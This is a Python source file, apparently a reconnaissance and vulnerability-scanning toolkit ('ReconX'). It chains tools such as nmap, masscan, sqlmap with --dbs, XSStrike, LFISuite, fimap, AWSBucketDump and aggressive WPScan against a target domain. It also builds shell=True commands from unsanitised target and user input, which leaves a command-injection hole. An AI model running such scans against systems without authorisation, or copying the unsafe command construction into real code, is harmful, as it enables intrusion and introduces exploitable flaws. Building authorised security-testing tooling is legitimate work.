#!/usr/bin/env python3
"""
ReconX - Advanced Bug Hunting Reconnaissance Toolkit
Author: 0nsec
Version: 1.0
Description: Automated reconnaissance and vulnerability scanning toolkit
"""

import os
import sys
import time
import json
import subprocess
import argparse
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from urllib.parse import urlparse

class Colors:
    """Color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class ReconX:
    def __init__(self, target, automated=False):
        self.target = target
        self.automated = automated
        self.domain = self.extract_domain(target)
        self.scan_dir = f"scanning/{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.create_directories()
        
    def extract_domain(self, target):
        """Extract domain from URL or return as is"""
        if target.startswith(('http://', 'https://')):
            return urlparse(target).netloc
        return target
    
    def create_directories(self):
        """Create necessary directories for scan results"""
        dirs = [
            f"{self.scan_dir}/subdomains",
            f"{self.scan_dir}/ports",
            f"{self.scan_dir}/screenshots", 
            f"{self.scan_dir}/directories",
            f"{self.scan_dir}/javascript",
            f"{self.scan_dir}/parameters",
            f"{self.scan_dir}/vulnerabilities/xss",
            f"{self.scan_dir}/vulnerabilities/sql",
            f"{self.scan_dir}/vulnerabilities/lfi",
            f"{self.scan_dir}/vulnerabilities/ssrf",
            f"{self.scan_dir}/vulnerabilities/redirect",
            f"{self.scan_dir}/headers",
            f"{self.scan_dir}/api",
            f"{self.scan_dir}/urls",
            f"{self.scan_dir}/s3buckets",
            f"{self.scan_dir}/cms",
            f"{self.scan_dir}/cms/wordpress",
            f"{self.scan_dir}/cms/joomla",
            f"{self.scan_dir}/cms/drupal",
            f"{self.scan_dir}/waf",
            f"{self.scan_dir}/git"
        ]
        
        for directory in dirs:
            Path(directory).mkdir(parents=True, exist_ok=True)
        
        self.print_info(f"Created scan directory: {self.scan_dir}")
    
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
 ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗██╗  ██╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║╚██╗██╔╝
 ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║ ╚███╔╝ 
 ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║ ██╔██╗ 
 ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██╔╝ ██╗
 ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
{Colors.END}
{Colors.YELLOW}Advanced Bug Hunting Reconnaissance Toolkit{Colors.END}
{Colors.GREEN}Author: 0nsec | Version: 1.0{Colors.END}
{Colors.BLUE}Target: {self.target}{Colors.END}
"""
        print(banner)
    
    def print_info(self, message):
        """Print info message"""
        print(f"{Colors.BLUE}[INFO]{Colors.END} {message}")
    
    def print_success(self, message):
        """Print success message"""
        print(f"{Colors.GREEN}[SUCCESS]{Colors.END} {message}")
    
    def print_warning(self, message):
        """Print warning message"""
        print(f"{Colors.YELLOW}[WARNING]{Colors.END} {message}")
    
    def print_error(self, message):
        """Print error message"""
        print(f"{Colors.RED}[ERROR]{Colors.END} {message}")
    
    def run_command(self, command, output_file=None, background=False):
        """Run shell command"""
        try:
            self.print_info(f"Running: {command}")
            if output_file:
                command = f"{command} > {output_file} 2>&1"
            
            if background:
                subprocess.Popen(command, shell=True)
                return True
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    self.print_success("Command completed successfully")
                    return True
                else:
                    self.print_error(f"Command failed: {result.stderr}")
                    return False
        except Exception as e:
            self.print_error(f"Error running command: {e}")
            return False
    
    def run_interactive_command(self, command, input_responses=None):
        """Run interactive command with predefined responses"""
        try:
            self.print_info(f"Running interactive: {command}")
            
            if input_responses:
                # Prepare input string
                input_str = "\n".join(input_responses) + "\n"
                
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                stdout, stderr = process.communicate(input=input_str)
                
                if process.returncode == 0:
                    self.print_success("Interactive command completed successfully")
                    return stdout, stderr
                else:
                    self.print_error(f"Interactive command failed: {stderr}")
                    return stdout, stderr
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout, result.stderr
                
        except Exception as e:
            self.print_error(f"Error running interactive command: {e}")
            return "", str(e)
    
    def check_tool_installed(self, tool):
        """Check if a tool is installed"""
        return subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode == 0
    
    def subdomain_enumeration(self):
        """Perform subdomain enumeration"""
        self.print_info("Starting subdomain enumeration...")
        
        subdomains_file = f"{self.scan_dir}/subdomains/subdomains.txt"
        
        # Subfinder
        if self.check_tool_installed('subfinder'):
            self.run_command(f"subfinder -d {self.domain} -o {self.scan_dir}/subdomains/subfinder.txt")
        else:
            self.print_warning("Subfinder not installed, skipping...")
        
        # Amass
        if self.check_tool_installed('amass'):
            self.run_command(f"amass enum -passive -d {self.domain} -o {self.scan_dir}/subdomains/amass.txt")
        else:
            self.print_warning("Amass not installed, skipping...")
        
        # Assetfinder
        if self.check_tool_installed('assetfinder'):
            self.run_command(f"assetfinder --subs-only {self.domain} >> {self.scan_dir}/subdomains/assetfinder.txt")
        else:
            self.print_warning("Assetfinder not installed, skipping...")
        
        # Combine all subdomain files
        self.run_command(f"cat {self.scan_dir}/subdomains/*.txt 2>/dev/null | sort -u > {subdomains_file}")
        self.print_success(f"Subdomain enumeration completed. Results saved to {subdomains_file}")
    
    def port_scanning(self):
        """Perform port scanning"""
        self.print_info("Starting port scanning...")
        
        # Nmap scan
        if self.check_tool_installed('nmap'):
            nmap_output = f"{self.scan_dir}/ports/nmap_{self.domain}.txt"
            self.run_command(f"nmap -p- --open -sV -sC -T4 -oN {nmap_output} {self.domain}")
        else:
            self.print_warning("Nmap not installed, skipping...")
        
        # Masscan
        if self.check_tool_installed('masscan'):
            masscan_output = f"{self.scan_dir}/ports/masscan_{self.domain}.txt"
            self.run_command(f"masscan -p1-65535 --rate 10000 -oL {masscan_output} {self.domain}")
        else:
            self.print_warning("Masscan not installed, skipping...")
        
        self.print_success("Port scanning completed")
    
    def take_screenshots(self):
        """Take screenshots of discovered services"""
        self.print_info("Taking screenshots...")
        
        subdomains_file = f"{self.scan_dir}/subdomains/subdomains.txt"
        
        # EyeWitness
        if os.path.exists(subdomains_file) and self.check_tool_installed('eyewitness'):
            self.run_command(f"eyewitness -f {subdomains_file} --web -d {self.scan_dir}/screenshots/eyewitness")
        
        # Aquatone
        if os.path.exists(subdomains_file) and self.check_tool_installed('aquatone'):
            self.run_command(f"cat {subdomains_file} | aquatone -out {self.scan_dir}/screenshots/aquatone")
        
        self.print_success("Screenshot capture completed")
    
    def directory_bruteforce(self):
        """Perform directory bruteforcing"""
        self.print_info("Starting directory bruteforcing...")
        
        # Check for wordlist locations in order of preference
        wordlist_paths = [
            "/usr/share/dirb/wordlists/common.txt",
            "/usr/share/wordlists/dirb/common.txt", 
            "wordlists/common.txt"
        ]
        
        wordlist = None
        for path in wordlist_paths:
            if os.path.exists(path):
                wordlist = path
                break
                
        if not wordlist:
            self.print_warning("No wordlist found, creating basic wordlist...")
            wordlist = "wordlists/common.txt"
            os.makedirs("wordlists", exist_ok=True)
            with open(wordlist, 'w') as f:
                f.write("admin\nadministrator\napi\nbackup\nconfig\ndashboard\ndebug\ndev\ndocs\ndownload\nfiles\nindex\nlogin\nmanager\ntest\nupload\nwp-admin\nwp-content\n")
        
        # FFUF
        if self.check_tool_installed('ffuf'):
            ffuf_output = f"{self.scan_dir}/directories/ffuf_{self.domain}.txt"
            self.run_command(f"ffuf -u https://{self.domain}/FUZZ -w {wordlist} -o {ffuf_output}")
        
        # Gobuster
        if self.check_tool_installed('gobuster'):
            gobuster_output = f"{self.scan_dir}/directories/gobuster_{self.domain}.txt"
            self.run_command(f"gobuster dir -u https://{self.domain} -w {wordlist} -o {gobuster_output}")
        
        self.print_success("Directory bruteforcing completed")
    
    def javascript_analysis(self):
        """Analyze JavaScript files"""
        self.print_info("Starting JavaScript analysis...")
        
        # LinkFinder
        linkfinder_dir = f"{self.scan_dir}/javascript/linkfinder"
        if os.path.exists("tools/LinkFinder/linkfinder.py"):
            self.run_command(f"python3 tools/LinkFinder/linkfinder.py -i https://{self.domain} -o {linkfinder_dir}")
        
        self.print_success("JavaScript analysis completed")
    
    def parameter_discovery(self):
        """Discover parameters"""
        self.print_info("Starting parameter discovery...")
        
        # Arjun
        if self.check_tool_installed('arjun'):
            arjun_output = f"{self.scan_dir}/parameters/arjun_{self.domain}.json"
            self.run_command(f"arjun -u https://{self.domain} -m GET -o {arjun_output}")
        
        # ParamSpider
        if os.path.exists("tools/paramspider/paramspider.py"):
            self.run_command(f"python3 tools/paramspider/paramspider.py -d {self.domain} -o {self.scan_dir}/parameters/paramspider.txt")
        
        self.print_success("Parameter discovery completed")
    
    def xss_testing(self):
        """Test for XSS vulnerabilities"""
        self.print_info("Starting XSS testing...")
        
        # Get URLs from various sources
        urls_to_test = []
        
        # Try to get URLs from parameter discovery
        params_file = f"{self.scan_dir}/parameters/params.txt"
        if os.path.exists(params_file):
            with open(params_file, 'r') as f:
                urls_to_test.extend([line.strip() for line in f.readlines() if line.strip()])
        
        # Add some common test URLs
        common_test_urls = [
            f"https://{self.domain}/search?q=test",
            f"https://{self.domain}/index.php?search=query",
            f"https://{self.domain}/?s=test",
            f"http://{self.domain}/search?q=test",
            f"http://{self.domain}/index.php?search=query"
        ]
        urls_to_test.extend(common_test_urls)
        
        # Dalfox testing
        if self.check_tool_installed('dalfox'):
            dalfox_output = f"{self.scan_dir}/vulnerabilities/xss/dalfox_{self.domain}.txt"
            
            if urls_to_test:
                # Create a temp file with URLs
                temp_urls_file = f"/tmp/xss_urls_{self.domain}.txt"
                with open(temp_urls_file, 'w') as f:
                    for url in urls_to_test[:10]:  # Limit to first 10 URLs
                        f.write(f"{url}\n")
                
                self.run_command(f"cat {temp_urls_file} | dalfox pipe -o {dalfox_output}")
                os.remove(temp_urls_file)
            else:
                # Test the main domain
                self.run_command(f"echo 'https://{self.domain}' | dalfox pipe -o {dalfox_output}")
        
        # XSStrike testing
        if os.path.exists("tools/XSStrike/xsstrike.py"):
            xsstrike_output = f"{self.scan_dir}/vulnerabilities/xss/xsstrike_{self.domain}.txt"
            
            if self.automated:
                # In automated mode, test common URLs
                test_url = f"https://{self.domain}/search?q=test"
                self.print_info(f"Testing XSS with automated URL: {test_url}")
                stdout, stderr = self.run_interactive_command(
                    f"python3 tools/XSStrike/xsstrike.py -u \"{test_url}\"",
                    input_responses=['']  # Empty input for any prompts
                )
                with open(xsstrike_output, 'w') as f:
                    f.write(stdout)
                    if stderr:
                        f.write(f"\n--- STDERR ---\n{stderr}")
            else:
                # Interactive mode - ask user for URL
                url = input(f"{Colors.YELLOW}Enter URL with parameter for XSS testing (e.g., https://{self.domain}/index.php?search=query): {Colors.END}")
                if url:
                    self.run_command(f"python3 tools/XSStrike/xsstrike.py -u \"{url}\" > {xsstrike_output}")
        
        self.print_success("XSS testing completed")
    
    def sql_injection_testing(self):
        """Test for SQL injection"""
        self.print_info("Starting SQL injection testing...")
        
        if self.check_tool_installed('sqlmap'):
            sqlmap_output = f"{self.scan_dir}/vulnerabilities/sql/sqlmap_{self.domain}.txt"
            
            if self.automated:
                # In automated mode, test common vulnerable parameters
                test_urls = [
                    f"https://{self.domain}/index.php?id=1",
                    f"https://{self.domain}/product.php?id=1",
                    f"https://{self.domain}/user.php?id=1",
                    f"https://{self.domain}/page.php?id=1",
                    f"http://{self.domain}/index.php?id=1"
                ]
                
                self.print_info("Testing common SQL injection points...")
                for url in test_urls[:2]:  # Test first 2 URLs to save time
                    self.print_info(f"Testing SQL injection on: {url}")
                    temp_output = f"{self.scan_dir}/vulnerabilities/sql/sqlmap_{self.domain}_{hash(url)}.txt"
                    self.run_command(f"timeout 60 sqlmap -u \"{url}\" --dbs --batch --random-agent --timeout=10 > {temp_output}")
            else:
                # Interactive mode - ask user for URL
                url = input(f"{Colors.YELLOW}Enter URL with parameter for SQL testing (e.g., https://{self.domain}/index.php?id=1): {Colors.END}")
                if url:
                    self.run_command(f"sqlmap -u \"{url}\" --dbs --batch --random-agent > {sqlmap_output}")
        
        self.print_success("SQL injection testing completed")
    
    def ssrf_rce_testing(self):
        """Test for SSRF and RCE"""
        self.print_info("Starting SSRF/RCE testing...")
        
        # Gopherus
        if os.path.exists("tools/Gopherus/gopherus.py"):
            self.print_info("Gopherus is available for manual SSRF payload generation")
        
        # Interactsh
        if self.check_tool_installed('interactsh-client'):
            self.print_info("Starting Interactsh client for OOB testing...")
            self.run_command("interactsh-client -v", background=True)
        
        self.print_success("SSRF/RCE testing setup completed")
    
    def lfi_rfi_testing(self):
        """Test for LFI/RFI vulnerabilities"""
        self.print_info("Starting LFI/RFI testing...")
        
        # LFISuite
        if os.path.exists("tools/LFISuite/lfisuite.py"):
            lfi_output = f"{self.scan_dir}/vulnerabilities/lfi/lfisuite_{self.domain}.txt"
            
            if self.automated:
                # Test common LFI parameters in automated mode
                test_urls = [
                    f"https://{self.domain}/index.php?file=test",
                    f"https://{self.domain}/page.php?page=home", 
                    f"https://{self.domain}/include.php?include=test",
                    f"http://{self.domain}/index.php?file=test"
                ]
                
                self.print_info("Testing common LFI parameters...")
                for url in test_urls[:2]:  # Test first 2 URLs
                    self.print_info(f"Testing LFI on: {url}")
                    temp_output = f"{self.scan_dir}/vulnerabilities/lfi/lfisuite_{hash(url)}.txt"
                    stdout, stderr = self.run_interactive_command(
                        f"timeout 60 python3 tools/LFISuite/lfisuite.py -u \"{url}\"",
                        input_responses=['1', 'n']  # Select option and no to interactive questions
                    )
                    with open(temp_output, 'w') as f:
                        f.write(stdout)
                        if stderr:
                            f.write(f"\n--- STDERR ---\n{stderr}")
            else:
                # Interactive mode
                url = input(f"{Colors.YELLOW}Enter URL for LFI testing (e.g., https://{self.domain}/index.php?file=test): {Colors.END}")
                if url:
                    self.run_command(f"python3 tools/LFISuite/lfisuite.py -u \"{url}\" > {lfi_output}")
        
        # Fimap
        if self.check_tool_installed('fimap'):
            fimap_output = f"{self.scan_dir}/vulnerabilities/lfi/fimap_{self.domain}.txt"
            
            if self.automated:
                # Test common RFI parameters
                test_urls = [
                    f"https://{self.domain}/index.php?page=home",
                    f"https://{self.domain}/include.php?file=test"
                ]
                for url in test_urls[:1]:  # Test first URL only
                    self.print_info(f"Testing RFI on: {url}")
                    self.run_command(f"timeout 30 fimap -u \"{url}\" > {fimap_output}")
                    break
            else:
                url = input(f"{Colors.YELLOW}Enter URL for RFI testing: {Colors.END}")
                if url:
                    self.run_command(f"fimap -u \"{url}\" > {fimap_output}")
        
        self.print_success("LFI/RFI testing completed")
    
    def open_redirect_testing(self):
        """Test for open redirect vulnerabilities"""
        self.print_info("Starting open redirect testing...")
        
        if os.path.exists("tools/Oralyzer/oralyzer.py"):
            urls_file = f"{self.scan_dir}/urls/urls.txt"
            payloads_file = "wordlists/redirect_payloads.txt"
            
            if os.path.exists(urls_file):
                redirect_output = f"{self.scan_dir}/vulnerabilities/redirect/oralyzer_{self.domain}.txt"
                self.run_command(f"python3 tools/Oralyzer/oralyzer.py -l {urls_file} -p {payloads_file} > {redirect_output}")
        
        self.print_success("Open redirect testing completed")
    
    def security_headers_check(self):
        """Check security headers"""
        self.print_info("Checking security headers...")
        
        # Nikto
        if self.check_tool_installed('nikto'):
            nikto_output = f"{self.scan_dir}/headers/nikto_{self.domain}.txt"
            self.run_command(f"nikto -h {self.domain} > {nikto_output}")
        
        # HTTPx
        if self.check_tool_installed('httpx'):
            httpx_output = f"{self.scan_dir}/headers/httpx_{self.domain}.txt"
            self.run_command(f"httpx -u {self.domain} -sc -title -server -o {httpx_output}")
        
        self.print_success("Security headers check completed")
    
    def api_reconnaissance(self):
        """Perform API reconnaissance"""
        self.print_info("Starting API reconnaissance...")
        
        # Kiterunner (requires pre-compiled kite files)
        if self.check_tool_installed('kr'):
            # Try with basic brute force mode since wordlist format is causing issues
            api_output = f"{self.scan_dir}/api/kiterunner_{self.domain}.txt"
            
            # Try to use routes compilation or skip if wordlist format is wrong
            success = self.run_command(f"kr brute https://{self.domain} > {api_output}")
            if not success:
                self.print_warning("KiteRunner failed with wordlist format, trying alternative approach...")
                # Alternative: Use directory brute force for API endpoints
                ffuf_output = f"{self.scan_dir}/api/ffuf_api_{self.domain}.txt"
                if self.check_tool_installed('ffuf'):
                    self.run_command(f"ffuf -u https://{self.domain}/FUZZ -w wordlists/apis.txt -mc 200,301,302,403 -o {ffuf_output}")
                else:
                    self.print_warning("KiteRunner and ffuf not available, skipping API endpoint discovery")
        
        # GAU
        if self.check_tool_installed('gau'):
            gau_output = f"{self.scan_dir}/urls/gau_{self.domain}.txt"
            self.run_command(f"gau {self.domain} | tee {gau_output}")
        
        # Waybackurls
        if self.check_tool_installed('waybackurls'):
            wayback_output = f"{self.scan_dir}/urls/wayback_{self.domain}.txt"
            self.run_command(f"waybackurls {self.domain} > {wayback_output}")
        
        self.print_success("API reconnaissance completed")
    
    def s3_bucket_enumeration(self):
        """Enumerate S3 buckets"""
        self.print_info("Starting S3 bucket enumeration...")
        
        if os.path.exists("tools/AWSBucketDump/AWSBucketDump.py"):
            buckets_file = f"wordlists/{self.domain}-buckets.txt"
            
            # Create bucket wordlist if it doesn't exist
            if not os.path.exists(buckets_file):
                with open(buckets_file, 'w') as f:
                    f.write(f"{self.domain}\n{self.domain.replace('.', '-')}\n{self.domain.replace('.', '')}\n")
                self.print_info(f"Created bucket wordlist: {buckets_file}")
            
            s3_output = f"{self.scan_dir}/s3buckets/s3_{self.domain}"
            self.run_command(f"python3 tools/AWSBucketDump/AWSBucketDump.py -l {buckets_file} -D {s3_output}")
        
        self.print_success("S3 bucket enumeration completed")
    
    def cms_enumeration(self):
        """Enumerate CMS information using multiple tools"""
        self.print_info("Starting comprehensive CMS enumeration...")
        
        # CMSeeK - Advanced CMS detection
        self.run_cmseek()
        
        # WhatWeb - Web technology identifier
        self.run_whatweb()
        
        # Wappalyzer - Technology profiling
        self.run_wappalyzer()
        
        # WordPress specific scanning
        self.run_wordpress_scans()
        
        # Joomla specific scanning  
        self.run_joomla_scans()
        
        # Drupal specific scanning
        self.run_drupal_scans()
        
        # Custom CMS fingerprinting
        self.run_custom_cms_fingerprinting()
        
        # Generate consolidated CMS report
        self.generate_cms_report()
        
        self.print_success("CMS enumeration completed")
    
    def run_cmseek(self):
        """Run CMSeeK for advanced CMS detection"""
        self.print_info("Running CMSeeK...")
        
        if os.path.exists("tools/CMSeeK/cmseek.py"):
            # Create CMSeeK Result directory if it doesn't exist
            cmseek_result_dir = f"tools/CMSeeK/Result"
            Path(cmseek_result_dir).mkdir(parents=True, exist_ok=True)
            
            cms_output = f"{self.scan_dir}/cms/cmseek_{self.domain}.txt"
            cms_json_output = f"{self.scan_dir}/cms/cmseek_{self.domain}.json"
            
            try:
                # Run CMSeeK with automatic 'yes' response for redirects
                command = f"python3 tools/CMSeeK/cmseek.py -u {self.domain}"
                
                # Use interactive command with 'y' response for redirect confirmation
                stdout, stderr = self.run_interactive_command(command, input_responses=['y'])
                
                # Save the text output
                with open(cms_output, 'w') as f:
                    f.write(stdout)
                    if stderr:
                        f.write(f"\n\n--- STDERR ---\n{stderr}")
                
                # Try to find and copy the JSON result if it exists
                potential_json_paths = [
                    f"tools/CMSeeK/Result/{self.domain}/cms.json",
                    f"tools/CMSeeK/Result/{self.domain.replace('https://', '').replace('http://', '')}/cms.json",
                    f"tools/CMSeeK/Result/{self.target}/cms.json"
                ]
                
                json_found = False
                for json_path in potential_json_paths:
                    if os.path.exists(json_path):
                        self.print_info(f"Found CMSeeK JSON result: {json_path}")
                        # Copy the JSON file to our scan directory
                        import shutil
                        shutil.copy2(json_path, cms_json_output)
                        json_found = True
                        break
                
                if not json_found:
                    # Parse the text output and create JSON manually
                    self.print_info("Creating JSON from CMSeeK text output...")
                    cms_data = self.parse_cmseek_output(stdout)
                    if cms_data:
                        with open(cms_json_output, 'w') as f:
                            json.dump(cms_data, f, indent=2)
                        self.print_success(f"CMSeeK results saved to {cms_json_output}")
                else:
                    self.print_success(f"CMSeeK JSON results copied to {cms_json_output}")
                    
            except Exception as e:
                self.print_error(f"Error during CMSeeK scan: {e}")
                # Fallback to simple command execution
                self.run_command(f"python3 tools/CMSeeK/cmseek.py -u {self.domain} > {cms_output}")
        else:
            self.print_warning("CMSeeK not found, skipping...")
    
    def run_whatweb(self):
        """Run WhatWeb for web technology identification"""
        self.print_info("Running WhatWeb...")
        
        if self.check_tool_installed('whatweb'):
            whatweb_output = f"{self.scan_dir}/cms/whatweb_{self.domain}.txt"
            whatweb_json = f"{self.scan_dir}/cms/whatweb_{self.domain}.json"
            
            # Run WhatWeb with different verbosity levels
            success1 = self.run_command(f"whatweb -v -a 3 --color=never {self.domain} > {whatweb_output}")
            success2 = self.run_command(f"whatweb --log-json {whatweb_json} -a 3 {self.domain}")
            
            if not success1 and not success2:
                self.print_warning("WhatWeb failed to execute properly, skipping...")
        else:
            self.print_warning("WhatWeb not installed, skipping WhatWeb scan...")
            self.print_info("Using manual detection methods instead...")
    
    def run_wappalyzer(self):
        """Run alternative technology detection (Wappalyzer is deprecated)"""
        self.print_info("Running technology detection...")
        
        # Since Wappalyzer CLI is deprecated, use alternative methods
        self.print_warning("Wappalyzer CLI is deprecated, using alternative detection methods...")
        
        # Use built-in technology detection instead
        tech_output = f"{self.scan_dir}/cms/technology_detection.json"
        
        try:
            # Use our custom fingerprinting which is more reliable
            self.print_info("Using enhanced custom technology detection...")
            
            # Enhanced technology detection using multiple methods
            tech_data = self.enhanced_technology_detection()
            
            with open(tech_output, 'w') as f:
                json.dump(tech_data, f, indent=2)
            
            self.print_success(f"Technology detection completed: {tech_output}")
            
        except Exception as e:
            self.print_error(f"Technology detection failed: {e}")
    
    def enhanced_technology_detection(self):
        """Enhanced technology detection using multiple indicators"""
        self.print_info("Running enhanced technology detection...")
        
        tech_data = {
            "target": self.domain,
            "scan_time": datetime.now().isoformat(),
            "technologies": {},
            "frameworks": {},
            "cms_detected": {},
            "servers": {},
            "languages": {},
            "databases": {},
            "confidence_scores": {}
        }
        
        try:
            # Analyze main page and common endpoints
            urls_to_check = [
                f"https://{self.domain}",
                f"http://{self.domain}",
                f"https://{self.domain}/robots.txt",
                f"https://{self.domain}/sitemap.xml"
            ]
            
            for url in urls_to_check:
                try:
                    response = requests.get(url, timeout=15, verify=False,
                                          headers={'User-Agent': 'Mozilla/5.0 (ReconX Technology Scanner)'})
                    
                    if response.status_code == 200:
                        self.analyze_response_for_tech(response, tech_data)
                        break  # Use first successful response
                        
                except requests.exceptions.RequestException:
                    continue
            
            # Calculate confidence scores
            self.calculate_confidence_scores(tech_data)
            
        except Exception as e:
            tech_data["error"] = str(e)
        
        return tech_data
    
    def analyze_response_for_tech(self, response, tech_data):
        """Analyze HTTP response for technology indicators"""
        
        # Analyze headers
        headers = dict(response.headers)
        tech_data["headers"] = headers
        
        # Server detection
        server_header = headers.get('Server', '').lower()
        if server_header:
            if 'apache' in server_header:
                tech_data["servers"]["Apache"] = {"version": server_header, "confidence": 90}
            elif 'nginx' in server_header:
                tech_data["servers"]["Nginx"] = {"version": server_header, "confidence": 90}
            elif 'iis' in server_header:
                tech_data["servers"]["IIS"] = {"version": server_header, "confidence": 90}
            elif 'cloudflare' in server_header:
                tech_data["servers"]["Cloudflare"] = {"version": server_header, "confidence": 85}
        
        # Language detection from headers
        x_powered_by = headers.get('X-Powered-By', '').lower()
        if x_powered_by:
            if 'php' in x_powered_by:
                tech_data["languages"]["PHP"] = {"version": x_powered_by, "confidence": 95}
            elif 'asp.net' in x_powered_by:
                tech_data["languages"]["ASP.NET"] = {"version": x_powered_by, "confidence": 95}
            elif 'express' in x_powered_by:
                tech_data["languages"]["Node.js"] = {"framework": "Express", "confidence": 90}
        
        # Content analysis
        content = response.text.lower()
        
        # CMS Detection
        cms_patterns = {
            'wordpress': {
                'patterns': ['wp-content', 'wp-includes', '/wp-json/', 'wordpress', 'wp-admin'],
                'weight': [20, 20, 25, 15, 20]
            },
            'joomla': {
                'patterns': ['joomla', 'com_content', 'mod_', '/administrator/', 'joomla.xml'],
                'weight': [25, 20, 15, 20, 20]
            },
            'drupal': {
                'patterns': ['drupal', 'sites/default', '/misc/', '/modules/', 'drupal.settings'],
                'weight': [25, 20, 15, 20, 20]
            },
            'magento': {
                'patterns': ['magento', 'mage/', 'skin/frontend', '/js/varien/', 'checkout/cart'],
                'weight': [30, 15, 15, 20, 20]
            },
            'prestashop': {
                'patterns': ['prestashop', '/themes/', '/modules/', 'prestashop.com', 'prestashop'],
                'weight': [25, 15, 15, 25, 20]
            },
            'shopify': {
                'patterns': ['shopify', 'shopifycdn', 'myshopify.com', 'shopify-analytics', 'shopify.js'],
                'weight': [30, 25, 20, 15, 10]
            },
            'moodle': {
                'patterns': ['moodle', 'course/view.php', 'login/index.php', 'mod/', 'moodledata'],
                'weight': [25, 20, 20, 15, 20]
            }
        }
        
        for cms, data in cms_patterns.items():
            score = 0
            found_patterns = []
            for i, pattern in enumerate(data['patterns']):
                if pattern in content:
                    score += data['weight'][i]
                    found_patterns.append(pattern)
            
            if score > 0:
                tech_data["cms_detected"][cms] = {
                    "confidence": min(score, 100),
                    "patterns_found": found_patterns,
                    "score": score
                }
        
        # JavaScript Framework Detection
        js_frameworks = {
            'react': {
                'patterns': ['react', '_react', 'reactjs', 'react-dom', 'react.js'],
                'weight': [25, 20, 20, 20, 15]
            },
            'angular': {
                'patterns': ['angular', 'ng-', 'angularjs', 'angular.js', '@angular'],
                'weight': [25, 20, 20, 20, 15]
            },
            'vue': {
                'patterns': ['vue.js', 'vue-', 'vuejs', '__vue__', 'vue/dist'],
                'weight': [30, 20, 20, 15, 15]
            },
            'jquery': {
                'patterns': ['jquery', '$(', 'jquery.min.js', 'jquery-', 'jquery.js'],
                'weight': [20, 25, 25, 15, 15]
            },
            'bootstrap': {
                'patterns': ['bootstrap', 'bootstrap.min.css', 'bs-', 'bootstrap.js', 'bootstrap/'],
                'weight': [20, 30, 15, 20, 15]
            }
        }
        
        for framework, data in js_frameworks.items():
            score = 0
            found_patterns = []
            for i, pattern in enumerate(data['patterns']):
                if pattern in content:
                    score += data['weight'][i]
                    found_patterns.append(pattern)
            
            if score > 0:
                tech_data["frameworks"][framework] = {
                    "confidence": min(score, 100),
                    "patterns_found": found_patterns,
                    "type": "javascript"
                }
        
        # Database detection (from error messages or indicators)
        db_patterns = {
            'mysql': ['mysql', 'mysqli', 'mysql error', 'mysql_connect'],
            'postgresql': ['postgresql', 'postgres', 'pg_connect', 'psql'],
            'mongodb': ['mongodb', 'mongo', 'mongoose', 'mongodb://'],
            'sqlite': ['sqlite', 'sqlite3', 'sqlite_', '.sqlite'],
            'mssql': ['mssql', 'microsoft sql server', 'sqlserver', 'mssqlserver']
        }
        
        for db, patterns in db_patterns.items():
            found = sum(1 for pattern in patterns if pattern in content)
            if found > 0:
                tech_data["databases"][db] = {
                    "confidence": min(found * 30, 100),
                    "indicators": found
                }
    
    def calculate_confidence_scores(self, tech_data):
        """Calculate overall confidence scores for detected technologies"""
        
        # Combine scores from different detection methods
        all_technologies = {}
        
        # Add CMS detections
        for cms, data in tech_data.get("cms_detected", {}).items():
            all_technologies[cms] = {
                "type": "CMS",
                "confidence": data["confidence"],
                "category": "Content Management System"
            }
        
        # Add framework detections  
        for framework, data in tech_data.get("frameworks", {}).items():
            all_technologies[framework] = {
                "type": "Framework", 
                "confidence": data["confidence"],
                "category": "JavaScript Framework"
            }
        
        # Add server detections
        for server, data in tech_data.get("servers", {}).items():
            all_technologies[server] = {
                "type": "Server",
                "confidence": data["confidence"], 
                "category": "Web Server"
            }
        
        # Add language detections
        for lang, data in tech_data.get("languages", {}).items():
            all_technologies[lang] = {
                "type": "Language",
                "confidence": data["confidence"],
                "category": "Programming Language"
            }
        
        tech_data["confidence_scores"] = all_technologies
    
    def run_wordpress_scans(self):
        """Run WordPress-specific scans"""
        self.print_info("Running WordPress-specific scans...")
        
        # WPScan
        if self.check_tool_installed('wpscan'):
            wp_output = f"{self.scan_dir}/cms/wordpress/wpscan_{self.domain}.txt"
            Path(f"{self.scan_dir}/cms/wordpress").mkdir(parents=True, exist_ok=True)
            
            # Basic WordPress scan
            self.run_command(f"wpscan --url https://{self.domain} --random-user-agent --detection-mode aggressive > {wp_output}")
            
            # WordPress vulnerability scan
            wp_vuln_output = f"{self.scan_dir}/cms/wordpress/wpscan_vulns_{self.domain}.txt"
            self.run_command(f"wpscan --url https://{self.domain} --enumerate vp,vt,cb,dbe --random-user-agent > {wp_vuln_output}")
        else:
            self.print_info("Installing WPScan...")
            if self.run_command("sudo gem install wpscan"):
                self.run_wordpress_scans()
            else:
                self.print_warning("Could not install WPScan, skipping WordPress scans...")
        
        # WordPress version detection via manual methods
        self.wordpress_manual_detection()
    
    def run_joomla_scans(self):
        """Run Joomla-specific scans"""
        self.print_info("Running Joomla-specific scans...")
        
        Path(f"{self.scan_dir}/cms/joomla").mkdir(parents=True, exist_ok=True)
        
        # JoomScan
        if os.path.exists("tools/joomscan/joomscan.pl"):
            joomla_output = f"{self.scan_dir}/cms/joomla/joomscan_{self.domain}.txt"
            self.run_command(f"perl tools/joomscan/joomscan.pl -u https://{self.domain} > {joomla_output}")
